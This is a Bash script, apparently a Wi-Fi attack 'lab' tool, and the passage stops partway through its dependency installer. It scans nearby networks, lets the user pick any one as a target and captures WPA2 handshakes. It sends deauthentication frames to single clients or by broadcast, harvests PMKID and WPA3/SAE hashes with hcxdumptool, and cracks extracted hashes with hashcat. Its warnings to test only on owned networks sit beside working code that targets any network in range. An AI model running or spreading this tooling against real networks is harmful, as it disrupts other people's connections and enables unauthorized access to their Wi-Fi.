#!/usr/bin/env bash
# ============================================================================
# WPA2 / WPA3 handshake capture lab - unified interactive tool
#
# Two strategies, one menu:
#   A) MONITOR mode : airodump-ng / hcxdumptool captures (needs a card whose
#                     monitor RX actually works - rtw88/RTL8821AU does NOT).
#   B) AP LAB        : hostapd turns your adapter into your OWN WPA2 AP; a
#                      client join produces the real 4-way handshake, captured
#                      on the AP interface. Works on any AP-capable adapter,
#                      no monitor mode needed.
#
# Test ONLY on networks you own / have explicit permission to audit.
# ============================================================================
set -uo pipefail

IFACE="${1:-}"
OUT_DIR="${2:-$HOME/lab}"
BASE="cap"
MON_IF=""
MON_METHOD=""  # "airmon" (airmon-ng vif) or "iw" (direct on main iface)
MON_ENTERED=0
CLEANED=0
HAS_MON=0
HAS_AP=0
MON_RX=-1   # -1 untested, 0 broken, 1 working
MON_RX_DATA=-1 # -1 untested, 0 broken (no data frames), 1 working
BUSY_CH=""   # busiest neighbor channel, set by scan_busiest_ch
CAP_PCAP=""  # pcap produced by capture_airodump_pcap

declare -a AP_BSSID=() AP_CH=() AP_ESSID=()
TARGET_BSSID=""
TARGET_CH=""
TARGET_ESSID=""

red()    { printf "\033[1;31m%s\033[0m\n" "$*"; }
green()  { printf "\033[1;32m%s\033[0m\n" "$*"; }
yellow() { printf "\033[1;33m%s\033[0m\n" "$*"; }
cyan()   { printf "\033[1;36m%s\033[0m\n" "$*"; }

banner() { cat <<'EOF'
  ------------------------------------------------
   WPA2 / WPA3 Handshake Capture Lab - Unified
   Monitor flow + AP-lab flow in one tool
   Use only on networks you own / are authorized
  ------------------------------------------------
EOF
}

die()    { red "[!] $*"; exit 1; }
need()   { hash "$1" 2>/dev/null || die "Missing tool: '$1' (install '$2')"; }

cleanup() {
    [[ $CLEANED -eq 1 ]] && return
    CLEANED=1
    echo
    yellow "[*] Cleaning up..."
    [[ -n "${AP_IF:-}" ]] && pkill -f "tcpdump -i $AP_IF" >/dev/null 2>&1 || true
    pkill -f "hostapd .*wormlab" >/dev/null 2>&1 || true
    kill "${HOSTAPD_PID:-}" "${DNSMASQ_PID:-}" "${TCPDUMP_PID:-}" >/dev/null 2>&1 || true
    pkill -f "airodump-ng" >/dev/null 2>&1 || true
    if [[ -n "$MON_IF" ]] && [[ -e "/sys/class/net/$MON_IF" ]]; then
        if [[ "$MON_METHOD" == "iw" ]]; then
            ip link set "$MON_IF" down >/dev/null 2>&1 || true
            iw dev "$MON_IF" set type managed >/dev/null 2>&1 || true
            ip link set "$MON_IF" up >/dev/null 2>&1 || true
        else
            airmon-ng stop "$MON_IF" >/dev/null 2>&1 || true
        fi
    fi
    rfkill unblock wifi >/dev/null 2>&1 || true
    # wpa_supplicant was killed by airmon-ng check kill; NetworkManager alone
    # often respawns its own, but be explicit so WiFi can auto-reconnect.
    service NetworkManager restart >/dev/null 2>&1 || systemctl restart NetworkManager >/dev/null 2>&1 || true
    # give NM a moment, then aggressively nudge the interface to connect
    sleep 3
    nmcli radio wifi on >/dev/null 2>&1 || true
    ip link set "$IFACE" up >/dev/null 2>&1 || true
    sleep 2
    nmcli device connect "$IFACE" >/dev/null 2>&1 || true
    green "[+] Network manager restored."
}
trap cleanup INT TERM EXIT

# ---------------------------------------------------------------- capability
capabilities() {
    local phy ifmode
    phy="$(basename "$(readlink -f "/sys/class/net/$IFACE/phy80211")" 2>/dev/null)"
    [[ -n "$phy" ]] || die "no phy found for $IFACE"
    ifmode="$(iw phy "$phy" info 2>/dev/null)"
    printf '%s' "$ifmode" | grep -qE '^\s+\* monitor' && HAS_MON=1
    printf '%s' "$ifmode" | grep -qE '^\s+\* AP$|^\s+\* AP ' && HAS_AP=1

    echo
    cyan "[*] Adapter capabilities ($IFACE / phy$phy):"
    printf '    monitor mode : %s\n' "$([[ $HAS_MON -eq 1 ]] && green YES || red NO)"
    printf '    AP mode      : %s\n' "$([[ $HAS_AP -eq 1 ]] && green YES || red NO)"
    if [[ $HAS_MON -eq 0 ]]; then
        yellow "    -> monitor flow disabled. Use the AP-lab flow (option 5)."
    elif [[ $HAS_AP -eq 0 ]] && [[ $MON_RX -eq 0 ]]; then
        yellow "    -> no monitor + no AP = lab impossible on this card."
    fi
}

# ---------------------------------------------------------------- monitor RX
# Realtek rtw88-family USB cards (RTL8811AU/8821AU/8812AU) go permanently deaf
# in monitor mode after interface churn (monitor/managed toggles + airmon-ng
# kill): RX drops to ~0 frames until the driver is reloaded or the dongle is
# replugged. A full module reload at the start of the monitor session fixes it.
# Verified on kernel 7.0: before reload 0-6 frames/15s, after reload 131 (ch11)
# and 85 (ch157) frames/15s on a TP-Link 802.11ac (2357:0120).
RTW_RELOADED=0
rtw88_reload() {
    local drv m
    drv="$(basename "$(readlink "/sys/class/net/$IFACE/device/driver" 2>/dev/null)" 2>/dev/null)"
    case "$drv" in
        rtw_8821au|rtw_8812au|rtw_8814au|rtw88_8821au|rtw88_8812au|rtw88_8814au) ;;
        *) return 0 ;;  # not a reload-affected driver
    esac
    [[ $RTW_RELOADED -eq 1 ]] && return
    RTW_RELOADED=1
    yellow "[*] Reloading $drv to clear the rtw88 USB RX stall..."
    nmcli device set "$IFACE" managed no >/dev/null 2>&1 || true
    ip link set "$IFACE" down >/dev/null 2>&1 || true
    # unload the whole rtw88 family in reverse dependency order (plain rmmod:
    # always works, and out-of-tree .ko files may be missing from /lib/modules)
    for _ in 1 2 3 4 5; do
        for m in $(ls /sys/module 2>/dev/null | grep -E '^(rtw88_|rtw_)' | tr '\n' ' '); do
            rmmod "$m" >/dev/null 2>&1 || true
        done
    done
    modprobe "$drv" >/dev/null 2>&1 || yellow "    (could not reload $drv - continuing)"
    sleep 3
    ip link set "$IFACE" up >/dev/null 2>&1 || true
    green "[+] $drv reloaded."
}

# Demonstration in this lab found mt7921e captures DATA frames only when the
# MAIN interface is set to monitor directly ("iw dev set type monitor").
# airmon-ng's separate "ifacemon" vif receives beacons but drops data frames.
# So prefer the direct-iw method.
enter_monitor() {
    [[ $MON_ENTERED -eq 1 ]] && return
    yellow "[*] Stopping NetworkManager to free the card (net drops; restored on exit)..."
    airmon-ng check kill >/dev/null 2>&1 || true
    rtw88_reload
    cyan "[*] Enabling monitor mode on $IFACE via direct iw..."
    # disable power-save BEFORE the mode switch (chip sleeps and never wakes
    # in monitor without an AP; setting it before AND after is what works)
    iw dev "$IFACE" set power_save off 2>/dev/null || true
    ip link set "$IFACE" down
    iw dev "$IFACE" set type monitor 2>/dev/null
    ip link set "$IFACE" up
    sleep 1
    MON_IF="$(find_mon_iface)"
    [[ -n "$MON_IF" ]] || die "No monitor interface created"
    MON_METHOD="iw"
    MON_ENTERED=1
    # Realtek rtw88-family USB cards (8811au/8821au/8812au) receive ~0 frames in
    # monitor while power-save is on: with no AP link the chip stays asleep and
    # nothing wakes it. Verified fix on Kernel 7.0 (in-kernel rtw88_8821au).
    iw dev "$MON_IF" set power_save off 2>/dev/null || true
    green "[+] Monitor interface: $MON_IF"
}

find_mon_iface() {
    local m
    m=$(iw dev 2>/dev/null | awk '/Interface/{n=$2} /type monitor/{print n}' | head -1)
    [[ -n "$m" ]] && { echo "$m"; return; }
    [[ -e "/sys/class/net/${IFACE}mon" ]] && { echo "${IFACE}mon"; return; }
    [[ -e "/sys/class/net/$IFACE" ]] && { echo "$IFACE"; return; }
}

# USB adapters get wlx<mac> names whose device dir is the USB *interface*
# (1-3:1.0); the product string lives on the parent USB device (1-3).
usb_prod() {
    local d="/sys/class/net/$1/device" p
    p="$(cat "$d/product" 2>/dev/null || cat "$d/../product" 2>/dev/null || cat "$d/interface" 2>/dev/null)"
    echo "${p:-unknown}"
}

# Find the channel with the most visible APs; mt7921e cannot be reliably
# re-pointed with "iw set channel" after a scan (it goes deaf), so we capture
# with airodump-ng on a FIXED channel instead of tcpdump.
scan_busiest_ch() {
    local pid s
    [[ -n "$BUSY_CH" ]] && return
    need airodump-ng
    s=10
    yellow "[*] Scanning (${s}s) for busiest channel..."
    rm -f /tmp/wgch-01.csv /tmp/wgch.log
    airodump-ng --band bg -w /tmp/wgch --output-format csv "$MON_IF" >>/tmp/wgch.log 2>&1 &
    pid=$!
    sleep "$s"
    kill "$pid" 2>/dev/null; wait "$pid" 2>/dev/null
    BUSY_CH="$(awk -F, 'NR>2 && $1 ~ /:/{gsub(/ /,"",$4); if($4!="") c[$4]++} END{for(ch in c) if(c[ch]>=bestc){bestc=c[ch];best=ch} print best}' /tmp/wgch-01.csv 2>/dev/null)"
    [[ -n "$BUSY_CH" ]] || BUSY_CH=6
    green "    busiest channel: $BUSY_CH"
}

# Run airodump on one fixed channel for N seconds, writing a pcap.
# Sets CAP_PCAP to the pcap path (empty on failure).
capture_airodump_pcap() {
    local ch="$1" secs="$2" base="/tmp/wgcap-$$" pid
    need airodump-ng
    CAP_PCAP=""
    rm -f "${base}-01.cap" "${base}-01.csv" "${base}-01.log.csv"
    airodump-ng --band bg -c "$ch" --write "$base" --output-format pcap,csv "$MON_IF" >/dev/null 2>&1 &
    pid=$!
    sleep "$secs"
    kill "$pid" 2>/dev/null; wait "$pid" 2>/dev/null
    [[ -e "${base}-01.cap" ]] && CAP_PCAP="${base}-01.cap"
}

# Counts frames in $CAP_PCAP. Sets RX_TOT and RX_DATA.
count_frames() {
    RX_TOT=0; RX_DATA=0
    [[ -n "$CAP_PCAP" ]] || return 0
    if command -v tshark >/dev/null 2>&1; then
        RX_TOT="$(tshark -r "$CAP_PCAP" 2>/dev/null | wc -l)"
        RX_DATA="$(tshark -r "$CAP_PCAP" -Y 'wlan.fc.type eq 2' 2>/dev/null | wc -l)"
    else
        need tcpdump
        RX_TOT="$(tcpdump -r "$CAP_PCAP" -e 2>/dev/null | wc -l)"
        RX_DATA="$(tcpdump -r "$CAP_PCAP" -e 2>/dev/null | grep -c '802.11 data' || true)"
    fi
}

test_monitor_rx() {
    need tcpdump tcpdump
    enter_monitor
    scan_busiest_ch
    yellow "[*] RX test: ${CAPS_PROBE_SECS:-6}s capture on ch$BUSY_CH (fixed-channel airodump)..."
    capture_airodump_pcap "$BUSY_CH" "${CAPS_PROBE_SECS:-6}"
    count_frames
    if [[ "${RX_TOT:-0}" -ge 5 ]]; then
        MON_RX=1; green "    OK - monitor RX works, saw $RX_TOT+ frames on ch$BUSY_CH."
    else
        MON_RX=0; red "    FAIL - $RX_TOT frames in 6s on ch$BUSY_CH. Monitor RX broken on this card/driver."
        if [[ $HAS_AP -eq 1 ]]; then
            green "    Use the AP-lab flow (option 5) instead - no monitor needed."
        fi
    fi
    sleep 1
}

# Distinguish "card sees radio activity" from "card can capture the frames
# a handshake needs". EAPOL 4-way frames are UNICAST (AP <-> phone, not
# addressed to us), so a card that only passes broadcast/mgmt frames will fail.
test_monitor_rx_data() {
    need airodump-ng aircrack-ng
    need tcpdump tcpdump
    enter_monitor
    MON_RX_DATA=0
    scan_busiest_ch
    yellow "[*] DATA-frame probe: ${CAPS_PROBE_SECS:-8}s on ch$BUSY_CH (busiest neighbor channel)..."
    capture_airodump_pcap "$BUSY_CH" "${CAPS_PROBE_SECS:-8}"
    count_frames
    if [[ "${RX_DATA:-0}" -gt 0 ]]; then
        MON_RX_DATA=1
        green "    DATA-RX OK - $RX_DATA data frame(s) of $RX_TOT total. EAPOL capture viable."
    else
        MON_RX_DATA=0
        red "    DATA-RX FAIL - $RX_TOT frame(s) seen, 0 data frames on ch$BUSY_CH."
        red "    Beacons/broadcasts may pass, but UNICAST data frames (EAPOL/4-way) are dropped by this firmware - handshake capture impossible."
        if [[ $HAS_AP -eq 1 ]]; then
            green "    -> Use option 8 (virtual lab) or a monitor-capable USB adapter."
        fi
    fi
    sleep 1
}

gate_data_rx() {
    # Auto-probe then bail out clearly if this card can't capture data frames.
    local reason="${1:-}"
    if [[ $MON_RX -eq -1 ]]; then
        red "      Monitor RX untested - probing now..."
        test_monitor_rx
    fi
    if [[ $MON_RX -eq 1 ]] && [[ $MON_RX_DATA -eq -1 ]]; then
        red "      Data-frame reception untested - probing now..."
        test_monitor_rx_data
    fi
    if [[ $MON_RX -ne 1 ]]; then
        red "      Monitor RX broken - run option 6 for full diagnosis."
        return 1
    fi
    if [[ $MON_RX_DATA -ne 1 ]]; then
        red "      This card cannot capture data frames (EAPOL)."
        red "      Use option 8 (virtual lab) or a monitor-capable USB adapter."
        [[ -n "$reason" ]] && red "      ($reason)"
        return 1
    fi
    return 0
}

# ---------------------------------------------------------------- CSV parse
parse_csv() {
    AP_BSSID=(); AP_CH=(); AP_ESSID=()
    local line
    while IFS= read -r line; do
        [[ "$line" == *"Station MAC"* ]] && break
        [[ "$line" =~ ^[0-9A-Fa-f:]{17} ]] || continue
        AP_BSSID+=("$(awk -F, '{gsub(/ /,"",$1); print $1}' <<<"$line")")
        AP_CH+=("$(awk    -F, '{gsub(/ /,"",$4); print $4}' <<<"$line")")
        AP_ESSID+=("$(awk -F, '{gsub(/ /,"",$14); print $14}' <<<"$line")")
    done < "$1"
}

scan_fixed() {
    local ch="$1" band="$2" secs="${3:-8}"
    rm -f /tmp/wgscan*.csv >/dev/null 2>&1
    cyan "[*] Fixed ch $ch ($band), $secs s..."
    airodump-ng --band "$band" -c "$ch" -w /tmp/wgscan --output-format csv "$MON_IF" >>/tmp/wgscan.log 2>&1 &
    local pid=$!
    sleep "$secs"
    kill "$pid" 2>/dev/null; wait "$pid" 2>/dev/null
    parse_csv /tmp/wgscan-01.csv 2>/dev/null
}

scan_wifi() {
    enter_monitor
    local secs="${1:-10}"
    rm -f /tmp/wgscan*.csv /tmp/wgscan.log >/dev/null 2>&1
    cyan "[*] Full-band scan $secs s..."
    airodump-ng --band abg -w /tmp/wgscan --output-format csv "$MON_IF" >>/tmp/wgscan.log 2>&1 &
    local pid=$!
    sleep "$secs"
    kill "$pid" 2>/dev/null; wait "$pid" 2>/dev/null

    parse_csv /tmp/wgscan-01.csv 2>/dev/null
    if [[ ${#AP_BSSID[@]} -eq 0 ]]; then
        yellow "[-] Full-band scan empty. airodump-ng output:"
        [[ -s /tmp/wgscan.log ]] && tail -8 /tmp/wgscan.log | sed 's/^/    /'
        [[ $MON_RX -eq -1 ]] && test_monitor_rx
        [[ $MON_RX -eq 1 ]] && [[ $MON_RX_DATA -eq -1 ]] && test_monitor_rx_data
        if [[ $MON_RX -eq 1 ]]; then
            yellow "[-] RX works but full-band empty; trying fixed channels..."
            scan_fixed 6 bg 8
            if [[ ${#AP_BSSID[@]} -eq 0 ]]; then scan_fixed 157 a 8; fi
        fi
    fi

    if [[ ${#AP_BSSID[@]} -eq 0 ]]; then
        red "[-] No networks captured. Monitor RX: $([[ $MON_RX -eq 1 ]] && echo OK || echo BROKEN)."
        red "    Card info:"
        echo "    adapter: $(usb_prod "$MON_IF")"
        echo "    driver : $(basename "$(readlink /sys/class/net/$MON_IF/device/driver 2>/dev/null)" 2>/dev/null)"
        [[ $HAS_AP -eq 1 ]] && green "    -> Switch to the AP-lab flow (option 5)."
        return 1
    fi
    green "[+] Found ${#AP_BSSID[@]} network(s)"
}

select_target() {
    if [[ ${#AP_BSSID[@]} -eq 0 ]]; then
        scan_wifi 12 || return 1
    fi
    echo
    cyan "[*] Networks seen:"
    local i
    for i in "${!AP_BSSID[@]}"; do
        printf "  %2d) %-17s  ch %-4s %s\n" "$((i+1))" "${AP_BSSID[$i]}" "${AP_CH[$i]}" "${AP_ESSID[$i]}"
    done
    echo "  0) Rescan"
    local pick
    while true; do
        read -r -p "[>] Pick target (0 to rescan): " pick
        if [[ "$pick" == "0" ]]; then
            scan_wifi 12 || return 1
            select_target; return
        fi
        [[ "$pick" =~ ^[0-9]+$ ]] && [[ "$pick" -ge 1 ]] && [[ "$pick" -le ${#AP_BSSID[@]} ]] && break
    done
    TARGET_BSSID="${AP_BSSID[$((pick-1))]}"
    TARGET_CH="${AP_CH[$((pick-1))]}"
    TARGET_ESSID="${AP_ESSID[$((pick-1))]}"
    green "[+] Target set: $TARGET_BSSID  (ch $TARGET_CH)  '$TARGET_ESSID'"
}

# ---------------------------------------------------------------- monitor flows
ensure_target() {
    [[ -n "$TARGET_BSSID" ]] || select_target || die "Choose a network first (option 1)."
}

capture_wpa2() {
    gate_data_rx "handshake capture" || { read -r -p "[>] Enter to return to menu"; return; }
    ensure_target
    local ts cap apid
    ts="$(date +%H%M%S)"; cap="${BASE}-${ts}"
    cyan "[*] Capturing handshake on $TARGET_BSSID (ch $TARGET_CH) -> ${OUT_DIR}/${cap}-01.cap"
    echo "[*] Watch for:  WPA handshake: $TARGET_BSSID"
    echo "[*] If none, toggle a client's WiFi (your phone)."
    # Run quietly: airodump's full-screen UI would hide our prompts below.
    airodump-ng -c "$TARGET_CH" --bssid "$TARGET_BSSID" -w "${OUT_DIR}/${cap}" "$MON_IF" >/dev/null 2>&1 &
    apid=$!

    sleep 15
    echo
    read -r -p "[>] Deauth a client? enter client MAC, or ENTER to skip: " client
    if [[ -n "$client" ]]; then
        aireplay-ng -0 3 -a "$TARGET_BSSID" -c "$client" "$MON_IF"
    else
        read -r -p "[>] Broadcast deauth (only on YOUR network)? (y/N): " bc
        [[ "${bc,,}" == "y" ]] && aireplay-ng -0 3 -a "$TARGET_BSSID" "$MON_IF"
    fi

    read -r -p "    ...press ENTER to stop capturing"
    kill "$apid" >/dev/null 2>&1 || true
    pkill -f "airodump-ng -c $TARGET_CH" >/dev/null 2>&1 || true
    sleep 2

    if aircrack-ng "${OUT_DIR}/${cap}-01.cap" 2>/dev/null | grep -qE 'WPA \([1-9][0-9]* handshake'; then
        green "[+] Handshake captured: ${OUT_DIR}/${cap}-01.cap"
        aircrack-ng "${OUT_DIR}/${cap}-01.cap" | grep -E 'WPA \([1-9][0-9]* handshake' || true
    else
        red "[-] No handshake yet. Retry and reconnect a client during the run."
    fi
}

capture_pmkid() {
    gate_data_rx "PMKID capture" || { read -r -p "[>] Enter to return to menu"; return; }
    need hcxdumptool hcxtools
    need hcxpcapngtool hcxtools
    ensure_target
    yellow "[*] hcxdumptool PMKID capture on $TARGET_BSSID (Ctrl+C to stop)..."
    hcxdumptool -i "$MON_IF" -o hcxdump --filterlist_ap="$TARGET_BSSID" --filtermode=2 || true
    hcxpcaptool -z hash.22000 hcxdump >/dev/null 2>&1
    [[ -s hash.22000 ]] && green "[+] PMKID saved: $OUT_DIR/hash.22000" \
        || yellow "[-] No PMKID captured for this AP."
}

capture_sae() {
    gate_data_rx "WPA3/SAE capture" || { read -r -p "[>] Enter to return to menu"; return; }
    need hcxdumptool hcxtools
    need hcxpcapngtool hcxtools
    ensure_target
    yellow "[*] hcxdumptool WPA3/SAE capture on $TARGET_BSSID (client must connect; Ctrl+C to stop)..."
    hcxdumptool -i "$MON_IF" -o hcxdump --filterlist_ap="$TARGET_BSSID" --filtermode=2 --rds=1 || true
    hcxpcaptool -z hash.22000 hcxdump >/dev/null 2>&1
    [[ -s hash.22000 ]] && green "[+] WPA3 hash saved: $OUT_DIR/hash.22000" || yellow "[-] No capture."
}

# ---------------------------------------------------------------- AP lab flow
ap_lab() {
    [[ $HAS_AP -eq 1 ]] || { red "This adapter doesn't support AP mode."; return; }
    for t in hostapd dnsmasq tcpdump; do need "$t" "$t"; done

    local api ssid pass s channel
    echo
    read -r -p "[>] AP SSID    [WormLab]: " ssid;  ssid="${ssid:-WormLab}"
    read -r -p "[>] WPA2 pass  [handshake123]: " pass; pass="${pass:-handshake123}"
    [[ ${#pass} -ge 8 ]] || { red "passphrase needs >= 8 chars"; return; }
    read -r -p "[>] Channel    [6]: " channel; channel="${channel:-6}"

    yellow "[*] Starting lab AP '$ssid' (WPA2, ch $channel) on $IFACE..."
    yellow "[*] Freeing interface from NetworkManager..."
    airmon-ng check kill >/dev/null 2>&1 || true
    ip link set "$IFACE" down
    iw dev "$IFACE" set type managed 2>/dev/null
    MON_ENTERED=0; MON_IF=""
    ip addr flush dev "$IFACE"
    ip addr add 10.10.0.1/24 dev "$IFACE"
    ip link set "$IFACE" up
    sleep 1
    AP_IF="$IFACE"

    local hc dns
    hc="$(mktemp /tmp/wg-ap-hostapd.XXXX)" || return
    dns="$(mktemp /tmp/wg-ap-dnsmasq.XXXX)" || return
    cat > "$hc" <<EOF
interface=$IFACE
driver=nl80211
ssid=$ssid
hw_mode=g
channel=$channel
wpa=2
wpa_passphrase=$pass
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
ignore_broadcast_ssid=0
EOF
    cat > "$dns" <<EOF
interface=$IFACE
dhcp-range=10.10.0.50,10.10.0.100,255.255.255.0,12h
port=0
EOF

    hostapd "$hc" &> /tmp/wg-ap-hostapd.log &
    HOSTAPD_PID=$!
    sleep 4
    kill -0 "$HOSTAPD_PID" 2>/dev/null || { red "hostapd failed:"; tail -10 /tmp/wg-ap-hostapd.log; return; }
    green "[+] AP up."
    dnsmasq -C "$dns" --no-daemon &> /tmp/wg-ap-dnsmasq.log &
    DNSMASQ_PID=$!
    sleep 1

    local pcap capif monv phy
    phy="$(basename "$(readlink -f "/sys/class/net/$IFACE/phy80211")" 2>/dev/null)"
    pcap="$OUT_DIR/ap-hs-$(date +%H%M%S).pcap"
    capif="$IFACE"
    monv=""
    if [[ -n "$phy" ]] && iw phy "$phy" interface add labmon type monitor >/dev/null 2>&1; then
        monv="labmon"
        ip link set "$monv" up 2>/dev/null
        capif="$monv"
    fi
    yellow "[*] Capturing EAPOL handshake on $capif -> $pcap"
    yellow "    NOW connect a device to '$ssid' with '$pass'"
    if [[ -n "$monv" ]]; then
        tcpdump -i "$monv" -e -w "$pcap" 'ether proto 0x888e' 2>/dev/null &
    else
        tcpdump -i "$IFACE" -e -w "$pcap" 'ether proto 0x888e' 2>/dev/null &
    fi
    TCPDUMP_PID=$!

    read -r -p "[>] Press ENTER when the client connected..."
    kill "$TCPDUMP_PID" >/dev/null 2>&1; wait "$TCPDUMP_PID" 2>/dev/null
    [[ -n "$monv" ]] && iw dev "$monv" del >/dev/null 2>&1
    sleep 1

    green "[+] Capture saved: $pcap"
    yellow "[*] EAPOL frames captured:"
    if command -v tshark >/dev/null; then tshark -r "$pcap" 2>/dev/null | head -16;
    else tcpdump -r "$pcap" 2>/dev/null | head -16; fi

    local h22000
    h22000="$OUT_DIR/lab-hs-$(date +%H%M%S).22000"
    if command -v hcxpcapngtool >/dev/null; then
        hcxpcapngtool "$pcap" -o "$h22000" >/dev/null 2>&1
        if [[ -s "$h22000" ]]; then
            green "[+] Handshake extracted -> hashcat -m 22000 $h22000 wordlist.txt"
            if command -v hashcat >/dev/null; then
                echo "$pass" > "$OUT_DIR/wordlist.txt"
                echo "ok123456" >> "$OUT_DIR/wordlist.txt"
                yellow "[*] Demo crack (tiny wordlist with your passphrase):"
                hashcat -m 22000 "$h22000" "$OUT_DIR/wordlist.txt" --force --quiet 2>/dev/null \
                    && grep "$pass" "$OUT_DIR/hashcat.potfile" 2>/dev/null >/dev/null \
                    && green "    Cracked: password is '$pass'" \
                    || yellow "    (hashcat run finished; check $OUT_DIR/hashcat.potfile)"
            fi
        else
            yellow "[-] No EAPOL extracted - client may not have completed auth."
        fi
    else
        yellow "[-] hcxtools not installed -> sudo apt install hcxtools"
    fi
}

# ---------------------------------------------------------------- hwsim lab
hwsim_lab() {
    for t in mac80211_hwsim hostapd wpa_supplicant tcpdump; do
        if [[ "$t" != "mac80211_hwsim" ]]; then need "$t" "$t"; fi
    done
    modprobe -r mac80211_hwsim 2>/dev/null || true
    modprobe mac80211_hwsim radios=3 2>/dev/null || die "cannot load mac80211_hwsim"

    local ssid pass channel ap mon sta pcap hc wp
    echo
    read -r -p "[>] Virtual AP SSID [HSIMLab]: " ssid;  ssid="${ssid:-HSIMLab}"
    read -r -p "[>] WPA2 pass     [virtpass123]: " pass; pass="${pass:-virtpass123}"
    [[ ${#pass} -ge 8 ]] || { red "passphrase needs >= 8 chars"; modprobe -r mac80211_hwsim; return; }
    read -r -p "[>] Channel       [6]: " channel; channel="${channel:-6}"

    local -a VIFS
    mapfile -t VIFS < <(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep -vx "$IFACE")
    [[ ${#VIFS[@]} -ge 3 ]] || { red "expected >=3 hwsim interfaces, got ${#VIFS[@]}: ${VIFS[*]:-none}"; modprobe -r mac80211_hwsim; return; }
    ap="${VIFS[0]}"; sta="${VIFS[1]}"; mon="${VIFS[2]}"
    yellow "[*] Virtual radios: AP=$ap client=$sta monitor=$mon"
    for i in "${VIFS[@]}"; do
        nmcli device set "$i" managed no >/dev/null 2>&1 || true
        ip link set "$i" down
    done
    iw dev "$ap" set type ap >/dev/null 2>&1
    iw dev "$mon" set type monitor >/dev/null 2>&1
    ip link set "$ap" up
    ip link set "$mon" up
    ip link set "$sta" up
    iw dev "$mon" set channel "$channel" >/dev/null 2>&1 || true

    hc="$(mktemp /tmp/wg-hwsim-hostapd.XXXX)"
    cat > "$hc" <<EOF
interface=$ap
driver=nl80211
ssid=$ssid
hw_mode=g
channel=$channel
wpa=2
wpa_passphrase=$pass
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
ignore_broadcast_ssid=0
EOF
    hostapd "$hc" &> /tmp/wg-hwsim-hostapd.log &
    HOSTAPD_PID=$!
    sleep 4
    kill -0 "$HOSTAPD_PID" 2>/dev/null || { red "hostapd failed:"; tail -8 /tmp/wg-hwsim-hostapd.log; modprobe -r mac80211_hwsim; return; }
    green "[+] Virtual AP '$ssid' up (ch $channel, iface $ap)"
    iw dev "$mon" set channel "$channel" >/dev/null 2>&1 || true

    pcap="$OUT_DIR/hsim-hs-$(date +%H%M%S).pcap"
    yellow "[*] Capturing all frames on $mon (monitor) -> $pcap"
    tcpdump -i "$mon" -w "$pcap" 2>/dev/null &
    TCPDUMP_PID=$!

    wp="$(mktemp /tmp/wg-hwsim-wpa.XXXX)"
    cat > "$wp" <<EOF
ctrl_interface=/var/run/wpa_supplicant
network={
    ssid="$ssid"
    psk="$pass"
}
EOF
    yellow "[*] Connecting virtual client $sta to '$ssid'..."
    wpa_supplicant -B -i "$sta" -c "$wp" -D nl80211 >/dev/null 2>&1
    local ok=0
    for _ in $(seq 1 12); do
        sleep 2
        iw dev "$sta" link 2>/dev/null | grep -q "Connected to" && { ok=1; green "    client associated"; break; }
    done
    sleep 3
    kill "$TCPDUMP_PID" >/dev/null 2>&1; wait "$TCPDUMP_PID" 2>/dev/null
    kill "$HOSTAPD_PID" >/dev/null 2>&1
    pkill -f "wpa_supplicant -B -i $sta" >/dev/null 2>&1 || true
    HOSTAPD_PID=""; TCPDUMP_PID=""

    green "[+] Capture saved: $pcap"
    [[ $ok -eq 1 ]] || yellow "    (client didn't associate - check /tmp/wg-hwsim-hostapd.log)"
    yellow "[*] EAPOL frames captured:"
    if command -v tshark >/dev/null; then tshark -r "$pcap" 2>/dev/null | head -12;
    else tcpdump -r "$pcap" 2>/dev/null | head -12; fi

    local h22000
    h22000="$OUT_DIR/hsim-hs-$(date +%H%M%S).22000"
    if command -v hcxpcapngtool >/dev/null; then
        hcxpcapngtool "$pcap" -o "$h22000" >/dev/null 2>&1
        if [[ -s "$h22000" ]]; then
            green "[+] Handshake extracted -> hashcat -m 22000 $h22000 wordlist.txt"
            if command -v hashcat >/dev/null; then
                echo "$pass" > "$OUT_DIR/wordlist.txt"
                echo "ok123456" >> "$OUT_DIR/wordlist.txt"
                yellow "[*] Demo crack:"
                hashcat -m 22000 "$h22000" "$OUT_DIR/wordlist.txt" --force --quiet 2>/dev/null \
                    && grep -q "$pass" "$OUT_DIR/hashcat.potfile" 2>/dev/null \
                    && green "    Cracked: password is '$pass'" \
                    || yellow "    (hashcat run finished; check $OUT_DIR/hashcat.potfile)"
            fi
        else
            yellow "[-] No EAPOL extracted."
        fi
    else
        yellow "[-] hcxtools not installed -> sudo apt install hcxtools"
    fi
    modprobe -r mac80211_hwsim >/dev/null 2>&1
}

# ---------------------------------------------------------------- misc
show_captures() {
    echo
    cyan "[*] Capture files in $OUT_DIR:"
    ls -lh "$OUT_DIR" 2>/dev/null | grep -iE "cap|pcap|22000|hcxdump" \
        || yellow "    (none yet)"
    read -r -p "[-] Press ENTER to continue..."
}

diagnose() {
    capabilities
    [[ $HAS_MON -eq 1 ]] && test_monitor_rx
    [[ $HAS_MON -eq 1 ]] && test_monitor_rx_data
    echo
    cyan "[*] Result:"
    printf '    any frames RX  : %s\n' "$([[ $MON_RX -eq 1 ]] && green OK || red BROKEN)"
    printf '    DATA frames RX : %s  (required for handshake/PMKID/SAE capture)\n' "$([[ $MON_RX_DATA -eq 1 ]] && green OK || red BROKEN)"
    echo
    cyan "[*] Manual checks you can run in a second terminal:"
    cat <<EOF
    sudo airmon-ng check kill
    sudo ip link set $IFACE down
    sudo iw dev $IFACE set type monitor
    sudo ip link set $IFACE up
    sudo timeout 8 airodump-ng $IFACE
    # raw frame proof (0 packets = broken monitor RX):
    sudo timeout 8 tcpdump -i $IFACE -c 20 -e
EOF
    read -r -p "[-] Press ENTER to continue..."
}

# ---------------------------------------------------------------- setup helpers
CONF="$HOME/.wormgpt-lab.conf"

load_conf() {
    [[ -f "$CONF" ]] && { . "$CONF" 2>/dev/null || true; } || true
}
save_conf() {
    printf 'SAVED_IFACE=%s\nSAVED_OUT_DIR=%s\n' "$IFACE" "$OUT_DIR" > "$CONF" 2>/dev/null || true
}

install_deps() {
    local pkgs=(aircrack-ng hcxtools hostapd dnsmasq tcpdump tshark hashcat)
    local miss=() t pm
    for t in "${pkgs[@]}"; do
        command -v "$t" >/dev/null 2>&1 || miss+=("$t")
    done
    if [[ ${#miss[@]} -eq 0 ]]; then
        green "    all tools present"
        return
    fi
    if command -v apt-get >/dev/null; then pm=apt
    elif command -v dnf >/dev/null; then pm=dnf
    elif command -v pacman >/dev/null; then pm=pacman
    fi
